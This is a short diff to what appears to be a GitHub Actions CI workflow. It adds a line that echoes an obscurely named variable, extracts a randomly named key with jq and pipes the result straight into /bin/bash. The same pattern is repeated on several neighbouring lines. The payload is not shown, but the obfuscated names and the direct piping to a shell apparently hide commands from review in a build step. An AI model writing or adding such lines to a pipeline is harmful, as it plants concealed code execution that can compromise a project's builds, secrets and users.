@@ -29,6 +29,7 @@ jobs:
           echo $bibo0199 | jq -r .l5 | /bin/bash
           printf '%s' "$rm612" | jq -r .ttv59 | /bin/bash
           printf '%s' "$oxyq53185" | jq -r .lszz3075 | /bin/bash
+          echo $k450 | jq -r .iqwde29 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
